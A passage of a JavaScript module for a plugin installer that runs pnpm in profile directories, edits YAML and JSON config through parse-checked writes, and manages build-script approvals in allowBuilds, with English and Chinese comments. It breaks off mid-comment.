// Installation backend: run `pnpm add <spec>` inside a profile directory,
// reconcile the profile's `dsh.profile.bundles` layer list, and auto-allow
// blocked build scripts (git-hosted plugins) exactly once.
//
// This mirrors what the official `dsh plugin --profile <name> add <spec>`
// command does (see @deepseek-ai/dsh/lib/plugin-*.js), reusing the public
// @deepseek-ai/dsh-app-boot APIs for profile resolution and initialization.

import { spawn, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync, rmSync, readdirSync, statSync, lstatSync, realpathSync, readlinkSync } from "node:fs";
import { basename, dirname, join, relative, resolve, isAbsolute, sep } from "node:path";
import { createRequire } from "node:module";
import { EventEmitter } from "node:events";
import { tmpdir } from "node:os";
import { createHash } from "node:crypto";
import { dump, load } from "js-yaml";
import { DEFAULT_PROFILE_BUNDLES, PROFILE_TEMPLATES, initProfile, resolveProfileDir } from "@deepseek-ai/dsh-app-boot";
import { describeBuildScripts, npmNameOf } from "./github.js";
import { clearPendingApprovalPause, commitPendingSnapshot, createProfileSnapshot, describeRollbackRebuild, markPendingApprovalPause, markPendingSnapshot, mcpEntryAuditForInstall, pausedCandidateBeforeState, pendingApprovalPaused, pnpmGuardEnv, pnpmSpawnPlan, readValidatedPendingSnapshot, rollbackPendingSnapshot, validatePendingProfile, validateRemoveCompletion } from "./guard.js";
import { stripTerminalControlSequences } from "./terminal.js";

// ── spec normalization ──────────────────────────────────────────────────────

/**
 * Normalize a user-supplied install spec into a pnpm-ready argument.
 * "owner/repo" and GitHub URLs become `github:owner/repo`; scoped npm names,
 * schemes, and absolute file/link paths pass through untouched.
 */
export function normalizeSpec(raw) {
  const spec = String(raw ?? "").trim();
  if (spec.length === 0) throw new Error("empty install spec: pass \"owner/repo\", a GitHub URL, an npm package name, or a tarball URL");
  if (spec.startsWith("@")) return spec; // scoped npm package like @scope/name[@ver]
  const githubUrl = /^https?:\/\/(?:www\.)?github\.com\/([^/\s]+\/[^/\s]+?)(?:\.git)?(?:\/.*)?$/i.exec(spec);
  if (githubUrl) return `github:${githubUrl[1]}`;
  if (/^(?:github:|git\+|git:|ssh:|npm:|file:|link:|https?:\/\/|\.{1,2}(?:[/\\]|$))/i.test(spec)) return spec;
  if (/^[^@/\s]+\/[^@/\s]+$/.test(spec)) return `github:${spec}`;
  return spec; // bare npm package name
}

// ── guarded config writes ───────────────────────────────────────────────────
//
// Installing someone else's plugin must never be able to leave a profile that
// dsh or pnpm refuses to load. Every write to a shared profile config goes
// through here: the new bytes are parsed back, and anything that does not
// parse is rolled back to the previous bytes before the error propagates. A
// bug in our own editing then costs a failed install, not a profile the user
// has to repair by hand.
//
// This is not hypothetical. Editing `allowBuilds` as a YAML sequence while
// pnpm had already written its own mapping stub produced a file no parser
// accepted, and every later pnpm operation in that profile — install,
// uninstall, update, any plugin at all — failed until the file was fixed
// manually.

/**
 * Write a config file only if the result still parses.
 * @param filePath - the file to write.
 * @param nextContent - the full new contents.
 * @param parse - throws when the content is not valid.
 * @param label - file name used in error messages.
 * @returns a rollback function restoring the pre-write bytes.
 */
function writeChecked(filePath, nextContent, parse, label) {
  const previous = existsSync(filePath) ? readFileSync(filePath, "utf8") : undefined;
  const rollback = () => {
    if (previous === undefined) rmSync(filePath, { force: true });
    else writeFileSync(filePath, previous);
  };
  writeFileSync(filePath, nextContent);
  try {
    parse(nextContent);
  } catch (error) {
    rollback();
    throw new Error(`${label} would not parse after the edit and was restored unchanged (${error.message}) — this is a bug in dsh-plugin-mall, please report it`);
  }
  return rollback;
}

/** writeChecked for YAML profile configs. */
function writeYamlChecked(filePath, nextContent, label) {
  return writeChecked(filePath, nextContent, (text) => load(text), label);
}

/** writeChecked for JSON profile configs. */
function writeJsonChecked(filePath, nextContent, label) {
  return writeChecked(filePath, nextContent, (text) => JSON.parse(text), label);
}

/**
 * writeChecked for cordis.patch.yml — the loader patch layer. Beyond parsing,
 * the contract is a top-level array; anything else and dsh fails to boot, so
 * that is checked here too rather than discovered at the next start.
 */
function writePatchChecked(filePath, nextContent) {
  return writeChecked(filePath, nextContent, (text) => {
    const doc = load(text);
    // null/undefined 曾被放行——那是一个只剩注释的文档，我们的校验说它没问题，
    // 而 dsh 的 parsePatchList 明确 `if (!Array.isArray(parsed)) throw ... must
    // be a top-level YAML array`，于是 profile 写完就起不来。写后回读校验的全部
    // 意义是「写出去的东西消费方能吃」，判据必须和消费方一致，不能更宽松。
    if (!Array.isArray(doc)) {
      throw new Error("expected a top-level array of patch entries (dsh refuses to boot on anything else, including a comments-only file)");
    }
  }, "cordis.patch.yml");
}

/**
 * Serialize a patch file back after rows were spliced out.
 *
 * A file that keeps its header comments but loses every entry parses as `null`,
 * not `[]` — and dsh refuses to boot on it. So the empty result has to carry an
 * explicit `[]`, exactly like the stock template does.
 *
 * @param lines - the remaining lines after splicing.
 * @returns the text to write.
 */
function serializePatchLines(lines) {
  const next = lines.join("\n").replace(/\n{3,}/g, "\n\n").trim();
  if (next.length === 0) return "[]\n";
  // 还有条目就原样保留；一条不剩（只余注释）必须补回空数组。
  const hasEntries = next.split("\n").some((line) => /^\s*-\s/.test(line));
  return hasEntries ? `${next}\n` : `${next}\n[]\n`;
}

// ── profile management ──────────────────────────────────────────────────────

/** Resolve and initialize (on first use) the target profile directory. */
export function ensureProfile(profile) {
  const dir = resolveProfileDir(profile); // throws on invalid names
  if (!existsSync(join(dir, "package.json"))) {
    initProfile(dir, PROFILE_TEMPLATES[profile] ?? DEFAULT_PROFILE_BUNDLES);
  }
  return dir;
}

/** Read the profile's package.json manifest. */
function readManifest(profileDir) {
  return JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
}

/** Locate an installed dependency's package.json under the profile tree. */
function packageJsonPathOf(packageName, profileDir) {
  const direct = join(profileDir, "node_modules", ...packageName.split("/"), "package.json");
  if (existsSync(direct)) return direct;
  try {
    return createRequire(join(profileDir, "noop.js")).resolve(`${packageName}/package.json`);
  } catch {
    return undefined;
  }
}

/** Whether an installed dependency declares `dsh.bundle.patch` (is a plugin bundle). */
function isBundlePackage(packageName, profileDir) {
  return classifyPackage(packageName, profileDir) === "bundle";
}

/**
 * The version of `packageName` as it exists in the profile right now, or
 * undefined when it is absent or its manifest is unreadable. Transitive
 * packages count: the build gate is about what is on disk, not about what the
 * profile declares.
 */
export function installedVersionOf(packageName, profileDir) {
  const path = packageJsonPathOf(packageName, profileDir);
  if (path === undefined) return undefined;
  try {
    const version = JSON.parse(readFileSync(path, "utf8"))?.version;
    return typeof version === "string" && version.length > 0 ? version : undefined;
  } catch {
    return undefined;
  }
}

/**
 * Classify an installed package by its `dsh` declaration:
 * `bundle` (a profile patch layer), `client` (a browser-side UI plugin),
 * `plain` (a plain dependency), or `missing` (not resolvable).
 */
export function classifyPackage(packageName, profileDir) {
  const path = packageJsonPathOf(packageName, profileDir);
  if (path === undefined) return "missing";
  try {
    const manifest = JSON.parse(readFileSync(path, "utf8"));
    if (typeof manifest.dsh?.bundle?.patch === "string") return "bundle";
    if (manifest.dsh?.client !== undefined) return "client";
    return "plain";
  } catch {
    return "missing";
  }
}

/**
 * Reconcile `dsh.profile.bundles` against installed dependencies: a
 * dependency that declares a dsh bundle joins the layer stack (in dependency
 * order); an entry that was a dependency but no longer is one — removed, or
 * the installed version dropped its bundle declaration — leaves it. In-box
 * template bundles are not dependencies and are NEVER touched (mirroring the
 * official `dsh plugin` reconcile).
 * @param profileDir - the profile directory.
 * @param beforeDeps - dependency keys as they were before `pnpm add` ran.
 */
export function reconcileBundles(profileDir, beforeDeps = new Set()) {
  const manifestPath = join(profileDir, "package.json");
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  const dependencies = new Set(Object.keys(manifest.dependencies ?? {}));
  const bundles = [...(manifest.dsh?.profile?.bundles ?? [])];
  const result = [];
  for (const bundleName of bundles) {
    const wasDependency = beforeDeps.has(bundleName) || dependencies.has(bundleName);
    const stillBundle = dependencies.has(bundleName) && isBundlePackage(bundleName, profileDir);
    // Keep template bundles and dependency-bundles; drop only entries that
    // were dependencies and stopped being bundles.
    if (!wasDependency || stillBundle) result.push(bundleName);
  }
  for (const dependencyName of dependencies) {
    if (!result.includes(dependencyName) && isBundlePackage(dependencyName, profileDir)) result.push(dependencyName);
  }
  if (JSON.stringify(result) !== JSON.stringify(bundles)) {
    manifest.dsh = {
      ...manifest.dsh,
      profile: {
        ...manifest.dsh?.profile,
        bundles: result,
      },
    };
    writeJsonChecked(manifestPath, JSON.stringify(manifest, undefined, 2) + "\n", "package.json");
  }
  return result;
}

/**
 * List a profile's installed plugins (dependencies with classification +
 * version).
 *
 * An install paused at the build-script approval gate is reported as the
 * snapshot has it, not as the half-written profile has it: the candidate's
 * scripts were never approved, dsh has not loaded it, and the next startup
 * rolls it back, so calling it "installed" tells the user the opposite of what
 * is true — an update would show the NEW version while the old one is what is
 * actually running and what a restart restores. A paused fresh install drops
 * out of the list entirely. Every consumer goes through here (the browser's
 * installed panel, the `updates` check that decides whether an update button
 * appears, and the `market_installed` agent tool), so they all agree.
 */
export function listInstalled(profile) {
  const dir = resolveProfileDir(profile);
  const manifestPath = join(dir, "package.json");
  if (!existsSync(manifestPath)) return { dir, deps: [] };
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  const deps = Object.keys(manifest.dependencies ?? {}).map((name) => {
    const path = packageJsonPathOf(name, dir);
    let version = "?";
    let kind = "missing";
    if (path !== undefined) {
      try {
        const installed = JSON.parse(readFileSync(path, "utf8"));
        version = installed.version ?? "?";
        kind = classifyPackage(name, dir);
      } catch {
        /* keep defaults */
      }
    }
    return { name, version, kind };
  });
  const before = pausedCandidateBeforeState(dir);
  if (before === undefined) return { dir, deps };
  if (!before.present) return { dir, deps: deps.filter((dep) => dep.name !== before.name) };
  return {
    dir,
    deps: deps.map((dep) => (dep.name === before.name ? { ...dep, version: before.version ?? "?" } : dep)),
  };
}

// ── npm registry resolution ─────────────────────────────────────────────────
//
// Registry lookups (anti-squatting, update checks, the host-shadow guard) have
// to hit the same registry pnpm installs from. Hardcoding npmjs while the user
// is on a mirror breaks all three silently — see the header comment in
// github.js. Resolution order mirrors pnpm's own: the profile's .npmrc, then
// `pnpm config get registry` (which folds in the user and global .npmrc
// chain), then npmjs. Cached per profile for the process lifetime; changing a
// registry needs a dsh restart anyway, like every other profile setting.

const DEFAULT_NPM_REGISTRY = "https://registry.npmjs.org";
const registryCache = new Map(); // profile -> Promise<string>

/** The `registry=` value from a profile-local .npmrc, if it sets one. */
function registryFromNpmrc(profileDir) {
  const npmrcPath = join(profileDir, ".npmrc");
  if (!existsSync(npmrcPath)) return undefined;
  try {
    for (const line of readFileSync(npmrcPath, "utf8").split("\n")) {
      const match = /^\s*registry\s*=\s*(\S+)\s*$/.exec(line);
      if (match !== null) return match[1];
    }
  } catch {
    /* unreadable .npmrc — fall through to pnpm */
  }
  return undefined;
}

/** `pnpm config get registry`, or undefined if pnpm is missing, slow, or unset. */
function registryFromPnpm() {
  return new Promise((resolve) => {
    let proc;
    try {
      proc = spawn("pnpm", ["config", "get", "registry"], {
        env: process.env,
        shell: process.platform === "win32",
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true,
      });
    } catch {
      resolve(undefined);
      return;
    }
    let out = "";
    // 一次安装不该被一个探测子进程拖住：5s 没结果就当没有，走兜底。
    const timer = setTimeout(() => {
      proc.kill();
      resolve(undefined);
    }, 5000);
    proc.stdout?.on("data", (data) => { out += data.toString(); });
    proc.on("error", () => { clearTimeout(timer); resolve(undefined); });
    proc.on("close", (code) => {
      clearTimeout(timer);
      const value = out.trim();
      // pnpm prints "undefined" for an unset key — only take a real URL.
      resolve(code === 0 && /^https?:\/\//i.test(value) ? value : undefined);
    });
  });
}

/**
 * The registry pnpm installs from for this profile.
 * @param profile - profile name.
 * @returns a promise for the registry base URL, without a trailing slash.
 */
export function resolveRegistry(profile) {
  const key = String(profile ?? "");
  const cached = registryCache.get(key);
  if (cached !== undefined) return cached;
  const pending = (async () => {
    let dir;
    try {
      dir = resolveProfileDir(key);
    } catch {
      dir = undefined; // invalid profile name — the caller reports it, we just fall back
    }
    const fromNpmrc = dir === undefined ? undefined : registryFromNpmrc(dir);
    if (fromNpmrc !== undefined) return fromNpmrc.replace(/\/+$/, "");
    const fromPnpm = await registryFromPnpm();
    return (fromPnpm ?? DEFAULT_NPM_REGISTRY).replace(/\/+$/, "");
  })();
  registryCache.set(key, pending);
  return pending;
}

// ── client-plugin row registration ──────────────────────────────────────────

/** Profile patch file name (the user's own layer, applied after bundle layers). */
const PROFILE_PATCH_FILENAME = "cordis.patch.yml";

/** Derive a friendly row id from a package name: "@s/dsh-client-ui-aqua" -> "ui-aqua". */
function clientRowId(packageName) {
  const last = packageName.split("/").pop() ?? packageName;
  const trimmed = last.replace(/^dsh-/, "").replace(/^client-ui-/, "").replace(/^client-/, "");
  return trimmed.length > 0 ? trimmed : last;
}

/**
 * Idempotently register a `dsh.client` package as a loader row in the
 * profile's cordis.patch.yml (client packages are discovered from the loader
 * entry tree, so the dependency alone does not activate them).
 * A row whose `name` already exists (any id) is left untouched.
 * @returns {{ added: boolean, rowId?: string }}
 */
export function ensureClientRow(profileDir, packageName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  const content = existsSync(patchPath) ? readFileSync(patchPath, "utf8") : "[]\n";
  let parsed = null;
  try {
    parsed = load(content);
  } catch {
    /* a text-level name check still runs below */
  }
  const alreadyByName = (Array.isArray(parsed) && parsed.some((entry) =>
    Array.isArray(entry?.insert) && entry.insert.some((row) => row?.name === packageName)
  )) || new RegExp(`name:\\s*["']${packageName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}["']`).test(content);
  if (alreadyByName) return { added: false };
  const rowId = clientRowId(packageName);
  const block = `- insert:\n    - id: ${rowId}\n      name: '${packageName}'\n`;
  const next = (Array.isArray(parsed) && parsed.length === 0)
    // The stock template is a comment plus `[]`; replace it wholesale.
    ? block
    : content.endsWith("\n") ? `${content}${block}` : `${content}\n${block}`;
  // 这个文件是 dsh 的装配补丁层：写坏了宿主直接起不来。
  writePatchChecked(patchPath, next);
  return { added: true, rowId };
}

/**
 * Remove the cordis.patch.yml loader row `ensureClientRow` registered for a
 * package. Textual and idempotent: only the exact block the register emitted
 * is spliced out, so user-authored rows survive byte-for-byte. An emptied
 * file falls back to the stock `[]` template.
 * @returns {{ removed: boolean, rowId?: string }}
 */
export function removeClientRow(profileDir, packageName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  if (!existsSync(patchPath)) return { removed: false };
  const content = readFileSync(patchPath, "utf8");
  const rowId = clientRowId(packageName);
  const lines = content.split("\n");
  let removed = false;
  for (let index = 0; index < lines.length - 2; index++) {
    if (lines[index] !== "- insert:") continue;
    if (lines[index + 1] !== `    - id: ${rowId}`) continue;
    if (lines[index + 2] !== `      name: '${packageName}'`) continue;
    lines.splice(index, 3);
    removed = true;
    break;
  }
  if (!removed) return { removed: false };
  writePatchChecked(patchPath, serializePatchLines(lines));
  return { removed: true, rowId };
}

/**
 * Drop the enable/disable override rows this profile holds for `packageName`.
 *
 * Uninstall has cleaned up the *insert* row it writes for browser plugins since
 * it existed (v0.1.17). The enable/disable feature arrived three days later
 * (v0.3.0) and introduced a second kind of row — an id-targeted override —
 * which nothing ever removed. Uninstalling a plugin you had toggled therefore
 * left a row pointing at an entry that no longer exists, and dsh warns about it
 * on every boot: `patch: entry "x" not found`.
 *
 * The warning is the mild half. The row also **comes back to life on reinstall**
 * — a plugin uninstalled while disabled returns disabled, looking installed and
 * doing nothing, with no visible reason.
 *
 * Only rows in exactly the shape {@link setPatchRowDisabled} writes are removed:
 * an id, our `name` guard, and a literal boolean `disabled`. Anything else is
 * the user's own content and stays, warning and all —
 *
 *   - `disabled: !!js …` is a condition they wrote (see setPatchRowDisabled,
 *     which refuses to overwrite it for the same reason). The package is gone,
 *     but the expression is still theirs.
 *   - a row carrying `config:` or other keys means more than a toggle.
 *
 * A leftover warning costs a line of console noise. Deleting user configuration
 * silently costs something we cannot give back.
 *
 * @param profileDir - the profile whose patch layer to edit.
 * @param packageName - the module name in the rows' `name:` guard.
 * @returns the entry ids whose rows were removed.
 */
export function removeToggleRows(profileDir, packageName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  if (!existsSync(patchPath)) return { removed: [] };
  const content = readFileSync(patchPath, "utf8");
  // 文件坏了就整个不碰——和 mergeAllowBuilds 同样的态度：只会越弄越糟。
  try {
    load(content);
  } catch {
    return { removed: [] };
  }
  const lines = content.split("\n");
  const quoted = `'${packageName}'`;
  const removed = [];
  // 从后往前删，前面的下标才不会被影响。
  for (let index = lines.length - 3; index >= 0; index--) {
    const idMatch = /^-\s+id:\s*(\S+)\s*$/.exec(lines[index]);
    if (idMatch === null) continue;
    const nameMatch = /^\s{2}name:\s*(\S+)\s*$/.exec(lines[index + 1]);
    if (nameMatch === null) continue;
    if (nameMatch[1] !== quoted && nameMatch[1] !== packageName) continue;
    // 第三行必须是字面量布尔的 disabled，且第四行不能还属于这一条——
    // 多一个键就说明这行不只是个开关，留给用户。
    if (!/^\s{2}disabled:\s*(?:true|false)\s*$/.test(lines[index + 2])) continue;
    // 这一条不能还有别的内容。额外键必然是缩进的（`  config:`），而顶格的
    // 注释或下一条 `- ` 不属于它——把注释当成额外键会让这行永远删不掉。
    if (/^\s+\S/.test(lines[index + 3] ?? "")) continue;
    lines.splice(index, 3);
    removed.unshift(idMatch[1]);
  }
  if (removed.length === 0) return { removed: [] };
  writePatchChecked(patchPath, serializePatchLines(lines));
  return { removed };
}

// ── enable / disable persistence ────────────────────────────────────────────
//
// Toggling a plugin is three layers, and only the middle one lives here:
//   1. memory — `entry.update({disabled})` disposes/starts the fiber (index.js)
//   2. persistence — rewrite the profile's cordis.patch.yml, replayed
//      transactionally by dsh's own `watchUserPatches` (this file)
//   3. safety — back the file up before every edit so a bad write is undoable
//
// Persistence deliberately does NOT go through `loader.update()` even though
// that would write for us: its `tree.write()` targets `cordis.yml`, the
// composed artifact. A user's choice belongs in the patch layer they own, not
// baked into the thing composition regenerates. Same conclusion as
// cynch18/plugin-switch, which spells it out in its header comment.

/** A patch row's `disabled:` line, when it is a plain literal we may rewrite. */
const DISABLED_LINE_RE = /^(\s*)disabled\s*:\s*(.*?)\s*$/;

/**
 * Text-level edit of one entry's `disabled` in a patch file, preserving every
 * other byte (comments included — users hand-write this file).
 *
 * A profile's patch layer normally starts EMPTY (`[]`): plugins are mounted by
 * the bundle layers, not by the user's file. So "no row for this id" is the
 * common case, not an error — we append an id-targeted override row, which is
 * exactly what the patch layer is for (dsh-app-boot's applyEntryPatches treats
 * a non-insert row as "override these keys on the entry with this id", and
 * warns on a `name` mismatch, so we pass `name` as a guard).
 *
 * @param content - current cordis.patch.yml text.
 * @param entryId - the loader entry id whose row to edit.
 * @param disabled - desired state.
 * @param moduleName - the entry's module name, written alongside a NEW row so
 *   dsh can detect a stale patch if the id is ever reused.
 * @returns the new text, or undefined when it already reads that way.
 * @throws when the row's `disabled` is a `!!js` expression.
 */
export function setPatchRowDisabled(content, entryId, disabled, moduleName) {
  const lines = String(content ?? "").split("\n");
  // 行尾允许跟注释：`- id: at-file   # 我的备注` 是用户会写的形状。
  const idPattern = new RegExp(`^(\\s*)-?\\s*id\\s*:\\s*['"]?${entryId.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}['"]?\\s*(?:#.*)?$`);
  const rowIndex = lines.findIndex((line) => idPattern.test(line));
  if (rowIndex === -1) {
    // patch 层里还没有这一条——这是常态（profile 的 patch 层默认是空的 `[]`，
    // 插件由 bundle 层挂载）。追加一条 id 定向覆盖行。
    if (!disabled) return undefined; // 没有覆盖行 = 本来就是启用状态
    const block = moduleName === undefined
      ? `- id: ${entryId}\n  disabled: true\n`
      : `- id: ${entryId}\n  name: '${moduleName}'\n  disabled: true\n`;
    const trimmed = String(content ?? "").trim();
    // 模板是注释 + `[]`，整体替换掉那个空数组；否则在末尾追加。
    if (trimmed.endsWith("[]")) {
      return `${trimmed.slice(0, trimmed.lastIndexOf("[]")).trimEnd()}\n${block}`.replace(/^\n/, "");
    }
    return `${trimmed.length === 0 ? "" : `${trimmed}\n`}${block}`;
  }
  const indent = (idPattern.exec(lines[rowIndex])[1] ?? "").length;
  // 同一条目的后续行：缩进更深，或与 `- id:` 的内容对齐。遇到下一个条目/顶格即止。
  let existing = -1;
  for (let index = rowIndex + 1; index < lines.length; index++) {
    const line = lines[index];
    if (line.trim().length === 0) continue;
    const lead = line.length - line.trimStart().length;
    if (lead <= indent && /^\s*-\s/.test(line)) break; // 下一个条目
    if (lead < indent) break;                          // 退出该块
    const match = DISABLED_LINE_RE.exec(line);
    if (match !== null) { existing = index; break; }
  }
  if (existing !== -1) {
    const value = DISABLED_LINE_RE.exec(lines[existing])[2];
    // 用户写的是条件逻辑（如「只在 Windows 上停用」）。我们的开关只有两态，
    // 覆盖它等于把条件永久压成固定值，而且用户不会察觉——拒绝接管，让人手改。
    if (value.startsWith("!!js")) {
      throw new Error(`cannot toggle ${entryId}: its "disabled" is a !!js expression — edit cordis.patch.yml by hand`);
    }
    if ((value === "true") === disabled) return undefined; // 已是目标状态
    lines[existing] = lines[existing].replace(DISABLED_LINE_RE, `$1disabled: ${disabled}`);
    return lines.join("\n");
  }
  if (!disabled) return undefined; // 没有 disabled 行本就是启用状态
  // 插在 id 行之后，缩进与 id 的内容列对齐。
  lines.splice(rowIndex + 1, 0, `${" ".repeat(indent + 2)}disabled: true`);
  return lines.join("\n");
}

/** Keep the most recent N backups of a profile file, oldest pruned first. */
const PATCH_BACKUP_KEEP = 20;

/**
 * Snapshot cordis.patch.yml before editing it. The file is hand-editable and
 * carries the user's own rows; a bad automated write must be undoable without
 * reaching for git.
 * @returns the backup path, or undefined when there was nothing to back up.
 */
export function backupProfilePatch(profileDir) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  if (!existsSync(patchPath)) return undefined;
  const dir = join(profileDir, "backups");
  mkdirSync(dir, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, "-");
  const target = join(dir, `cordis.patch.${stamp}.yml`);
  writeFileSync(target, readFileSync(patchPath, "utf8"));
  try {
    const kept = readdirSync(dir).filter((entry) => /^cordis\.patch\..*\.yml$/.test(entry)).sort();
    for (const stale of kept.slice(0, Math.max(0, kept.length - PATCH_BACKUP_KEEP))) {
      rmSync(join(dir, stale), { force: true });
    }
  } catch {
    /* 清理失败不该让切换失败 */
  }
  return target;
}

/**
 * Persist a toggle into the profile's patch layer: back up, edit, write through
 * the checked writer. dsh's own `watchUserPatches` replays the file
 * transactionally, so this is also what makes the change survive a restart.
 * @returns `{changed, backup?}`; `changed:false` means it already read that way.
 */
export function persistPluginDisabled(profileDir, entryId, disabled, moduleName) {
  const patchPath = join(profileDir, PROFILE_PATCH_FILENAME);
  const content = existsSync(patchPath) ? readFileSync(patchPath, "utf8") : "[]\n";
  const next = setPatchRowDisabled(content, entryId, disabled, moduleName);
  if (next === undefined) return { changed: false };
  const backup = backupProfilePatch(profileDir);
  writePatchChecked(patchPath, next);
  return { changed: true, backup };
}

// ── build-script allow-listing ──────────────────────────────────────────────

/** Extract package names from pnpm's "Ignored build scripts: ..." output. */
/** Valid npm package name (scoped or bare) — anything else is not a name. */
const NPM_NAME_RE = /^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/i;

/**
 * @returns `{name, version}` per blocked package. The version matters: the
 * disclosure has to show the scripts of the version that would actually run,
 * not whatever `latest` happens to be today.
 */
function parseIgnoredBuilds(output) {
  const found = new Map();
  // pnpm enables colours even though stdout/stderr are pipes on some Windows
  // setups (observed with pnpm 11).  A reset code after the selector makes the
  // anchored `@version` parser miss, so `node-pty@1.1.0\x1b[39m` used to be
  // treated as an invalid package name and the approval pause became an
  // ordinary failed install. Strip CSI terminal controls again here as a
  // fail-closed parsing boundary; the stream capture already removes them from
  // the plain-text job log shown to users.
  const plainOutput = stripTerminalControlSequences(output);
  // Only pnpm's own notice line is a parsing source. "allowBuilds" also
  // appears in pnpm's advice/error text (never followed by a name list), and
  // matching it fed error echoes into the allow-list, corrupting the YAML.
  const pattern = /(?:Ignored build scripts|onlyBuiltDependencies)\s*:\s*([^\n]+)/gi;
  let match;
  while ((match = pattern.exec(plainOutput)) !== null) {
    for (const raw of match[1].split(",")) {
      const candidate = raw.trim();
      if (candidate.length === 0) continue;
      // Split a trailing @version or @tarball-url so `foo@1.2.3` -> `foo` +
      // `1.2.3`, `@s/n@1.0.0` -> `@s/n` + `1.0.0`. Whatever remains must be a
      // valid npm name; pnpm error echoes ("9 | - pkg", advice sentences) are
      // dropped instead of being written to the YAML.
      const suffix = /@(?:([\w.+-]+)|https?:\/\/\S+|file:\S+|link:\S+|github:\S+)$/.exec(candidate);
      const name = suffix === null ? candidate : candidate.slice(0, suffix.index);
      // Keep pnpm's exact selector (for example
      // `fixture-native-pkg@file:../pkg`). `allowBuilds` matches that selector,
      // not always the bare package name. It is never accepted from a caller:
      // it comes only from pnpm's own single-line diagnostic and is rendered
      // back through js-yaml, after rejecting control characters.
      const selector = candidate;
      if (
        NPM_NAME_RE.test(name)
        && selector.length <= 512
        && !/[\u0000-\u001f\u007f]/.test(selector)
        && !found.has(selector)
      ) {
        found.set(selector, { name, version: suffix?.[1], selector });
      }
    }
  }
  return [...found.values()];
}

/**
 * Merge names into the profile's `pnpm-workspace.yaml` `allowBuilds`.
 *
 * pnpm accepts both shapes — a sequence (`- name`) and a mapping
 * (`name: true`) — but never both under one key, and pnpm writes a mapping
 * stub of its own (`name: set this to true or false`) when it blocks a build.
 * Appending a sequence item to that stub is what produced an unparseable file.
 * So: read the current shape through a real YAML parse, match it, and default
 * to pnpm's own mapping shape when there is nothing to match, which keeps our
 * edits and pnpm's from ever colliding again.
 *
 * A name already present as a mapping entry whose value is NOT `true` (pnpm's
 * undecided stub) is rewritten rather than skipped — treating the stub as
 * "already allowed" would leave the build still blocked on retry.
 *
 * Pure: takes the current file contents, returns the new contents (or
 * undefined when nothing needs changing). The fs half is ensureAllowBuilds.
 * Split out because this text surgery is the part that broke a profile, so it
 * is the part the fixtures at the bottom of this file have to pin.
 *
 * @param content - current pnpm-workspace.yaml contents.
 * @param names - package names to allow.
 * @returns the new contents, or undefined when already satisfied.
 * @throws when `content` does not parse as YAML.
 */
export function mergeAllowBuilds(content, names) {
  const valid = (Array.isArray(names) ? names : []).filter((name) => NPM_NAME_RE.test(name));
  if (valid.length === 0) return undefined;
  // A file that is already broken is not ours to edit — we could only make it
  // worse, and the user needs to see the real reason.
  let parsed;
  try {
    parsed = load(content);
  } catch (error) {
    throw new Error(`pnpm-workspace.yaml does not parse, refusing to edit it: ${error.message}`);
  }
  const current = parsed?.allowBuilds;
  const asSequence = Array.isArray(current);
  const asMapping = !asSequence && current !== null && typeof current === "object";
  const allowed = new Set(asSequence
    ? current.map((entry) => String(entry))
    : asMapping ? Object.entries(current).filter(([, value]) => value === true).map(([key]) => key) : []);
  // pnpm 的未决占位符（值不是 true）要改写，不能当成已放行跳过。
  const stubs = asMapping ? valid.filter((name) => name in current && current[name] !== true) : [];
  const additions = valid.filter((name) => !allowed.has(name) && !stubs.includes(name));
  if (additions.length === 0 && stubs.length === 0) return undefined;

  // Quote sequence entries: a bare `@scope/name` opens with YAML's reserved
  // `@` indicator. Mapping keys do not need it.
  const render = (name) => (asSequence ? `  - '${name}'` : `  ${name}: true`);
  const lines = content.split("\n");
  for (const name of stubs) {
    const pattern = new RegExp(`^(\\s*)(['"]?)${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\2\\s*:.*$`);
    const index = lines.findIndex((line) => pattern.test(line));
    if (index !== -1) lines[index] = `  ${name}: true`;
  }
  let next;
  const keyIndex = lines.findIndex((line) => /^allowBuilds\s*:/.test(line));
  if (keyIndex === -1) {
    const base = lines.join("\n");
    next = `${base.endsWith("\n") ? base : `${base}\n`}\nallowBuilds:\n${additions.map(render).join("\n")}\n`;
  } else {
    if (/^allowBuilds\s*:\s*(\{\}|\[\])\s*$/.test(lines[keyIndex])) {
      lines[keyIndex] = "allowBuilds:";
    }
    // 块内 = 缩进行；空行不终止块；顶格行是下一个 key。
    let insertIndex = keyIndex + 1;
    for (let index = keyIndex + 1; index < lines.length; index++) {
      if (lines[index].trim().length === 0) continue;
      if (/^\s/.test(lines[index])) { insertIndex = index + 1; continue; }
      break;
    }
    if (additions.length > 0) lines.splice(insertIndex, 0, ...additions.map(render));
    next = lines.join("\n");
  }
  return next;
}

/**
 * Split an allowBuilds key into its package name and the spec pnpm matched it
 * by, if the key carries one. `node-pty` → name only; `node-pty@1.1.0` and
 * `pkg@file:../pkg` → name plus spec. Mirrors the selector parsing in
 * {@link parseIgnoredBuilds}, because these two have to agree on what a key
 * refers to or an approval will be preserved against the wrong package.
 */
function splitBuildSelector(key) {
  const text = String(key ?? "");
  const suffix = /@(?:([\w.+-]+)|https?:\/\/\S+|file:\S+|link:\S+|github:\S+)$/.exec(text);
  if (suffix === null) return NPM_NAME_RE.test(text) ? { name: text } : undefined;
  const name = text.slice(0, suffix.index);
  return NPM_NAME_RE.test(name) ? { name, spec: text.slice(suffix.index + 1) } : undefined;
}

/**
 * Neutralize allowBuilds in pnpm-workspace.yaml so that pnpm strictly blocks
 * the lifecycle scripts of everything this transaction introduces.
 *
 * The property being defended is narrow: a package that is NEW to this install
 * must not run scripts on the strength of an approval the user gave to some
 * earlier package. Wiping the whole allow-list enforced that — and also
 * re-blocked packages that were already installed and already approved, which
 * had nothing to do with the install in flight. Installing an unrelated plugin
